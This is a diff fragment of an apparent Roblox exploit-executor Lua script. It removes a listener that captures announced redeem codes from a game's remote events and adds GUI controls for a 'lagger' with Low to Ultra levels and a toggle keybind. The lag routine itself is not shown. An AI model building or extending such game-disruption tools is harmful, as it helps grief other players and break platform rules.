+            actualizarKeybind()
+            listeningForInput = false
+            TextButton4.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+            SaveConfig()
         end
     end
-    return nil
-end
-
-local function yazinStripRich(text)
-    if type(text) ~= "string" then return tostring(text) end
-    return (text:gsub("<[^>]->", ""))
-end
-
-local function yazinTokenize(text)
-    local words = {}
-    for word in text:gmatch("[%w_]+") do
-        words[#words + 1] = word
-    end
-    return words
-end
-
-local yazinCollectBuffer = {}
-local function onYazinAnnouncement(...)
-    local text = yazinStripRich(tostring((...) or ""))
-    text = text:match("^%s*(.-)%s*$") or ""
-    if text == "" or text:find("%s") then return end
-    
-    for _, word in ipairs(yazinTokenize(text)) do
-        yazinCollectBuffer[#yazinCollectBuffer + 1] = word
-    end
-    
-    local parts = {}
-    for index = 1, math.min(#yazinCollectBuffer, YAZIN_WORD_COUNT) do
-        parts[index] = yazinCollectBuffer[index]
-    end
-    if #yazinCollectBuffer < YAZIN_WORD_COUNT then return end
-    yazinCollectBuffer = {}
-    
-    local captured = table.concat(parts)
-    if captured == "" or _seen[captured] then return end
-    _seen[captured] = true
-    task.delay(1.25, function() _seen[captured] = nil end)
-    appendToBox(captured)
-end
-
-local yazinNotifyRemote = resolveNotifyRemote()
-local yazinListenConnection
-if yazinNotifyRemote then
-    if getgenv then
-        local previous = getgenv().YazinCodeReedemerNotifyConnection
-        if previous then pcall(function() previous:Disconnect() end) end
-    end
-    yazinListenConnection = yazinNotifyRemote.OnClientEvent:Connect(function(...)
-        if not _enabled then return end
-        pcall(onYazinAnnouncement, ...)
-    end)
-    if getgenv then getgenv().YazinCodeReedemerNotifyConnection = yazinListenConnection end
-end
-
-if getgenv then
-    getgenv().StopAura = function()
-        if yazinListenConnection then
-            pcall(function() yazinListenConnection:Disconnect() end)
-            yazinListenConnection = nil
+    if not gp and not listeningForInput then
+        if input.KeyCode == keybind then
+            toggleLagger()
         end
-        if GUI then GUI:Destroy() end
     end
-end
+end)
+TextButton6.MouseButton1Click:Connect(function()
+    nivelActual = "Low"
+    actualizarBotonesNivel()
+    SaveConfig()
+end)
+TextButton7.MouseButton1Click:Connect(function()
+    nivelActual = "Mid"
+    actualizarBotonesNivel()
+    SaveConfig()
+end)
+TextButton8.MouseButton1Click:Connect(function()
+    nivelActual = "High"
+    actualizarBotonesNivel()
+    SaveConfig()
+end)
+TextButton9.MouseButton1Click:Connect(function()
+    Frame14.Visible = true
+end)
+TextButton10.MouseButton1Click:Connect(function()
+    nivelActual = "Ultra"
+    actualizarBotonesNivel()
+    SaveConfig()
+    Frame14.Visible = false
+end)
+TextButton11.MouseButton1Click:Connect(function()
+    Frame14.Visible = false
+end)
+TextButton3.MouseButton1Click:Connect(function()
+    ventanaBloqueada = not ventanaBloqueada
+    actualizarLock()
+    SaveConfig()
+end)
+TextButton.MouseButton1Click:Connect(function()
+    if currentScale > MIN_SCALE then
+        currentScale = math.max(MIN_SCALE, currentScale - SCALE_STEP)
+        updateScale()
+    end
+end)
+TextButton2.MouseButton1Click:Connect(function()
+    if currentScale < MAX_SCALE then
+        currentScale = math.min(MAX_SCALE, currentScale + SCALE_STEP)
+        updateScale()
+    end
+end)
+local isDragging, dragStart, startPos = false, nil, nil
+MainFrame.InputBegan:Connect(function(input)
+    if ventanaBloqueada then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not isDragging or ventanaBloqueada then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+MainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+    end
+end)
+actualizarBotonesNivel()
+actualizarToggle()
+actualizarKeybind()
+actualizarLock()
